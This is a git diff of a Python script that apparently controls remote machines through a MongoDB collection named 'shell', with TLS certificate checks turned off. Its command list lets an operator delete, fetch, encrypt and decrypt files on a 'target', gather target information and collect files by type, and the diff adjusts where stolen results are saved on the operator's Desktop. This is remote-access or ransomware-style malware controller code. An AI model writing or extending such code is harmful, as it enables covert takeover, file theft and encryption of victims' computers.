@@ -5,9 +5,9 @@ import numpy as np
 import requests
 from colorama import Fore,init
 import os
-import gzip
 
-MY_FAV_ROOT='C:\\Users'
+
+MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
 MY_FAV_FOLDER='ShellUtsav'
 
 init(autoreset=True)
@@ -18,7 +18,7 @@ client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
 db=client['shell']
 
-MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','getimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles']
+MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles']
 
 CWD=r""
 LAST_PATH=""
@@ -109,7 +109,7 @@ def clearCollection():
 
 def binaryContent():
     global MY_FAV_ROOT,MY_FAV_FOLDER
-    if not (os.path.exists(MY_FAV_ROOT+MY_FAV_FOLDER)):
+    if not (os.path.exists(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")):
         os.mkdir(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")
     col=db['shellresult']
     filters={
@@ -176,7 +176,7 @@ def ActionUploader():
             print(i)
         print()
 
-    elif a[0]=='getimg':
+    elif a[0]=='showimg':
         target_element=a[1]
         data={
                 "action":a[0],
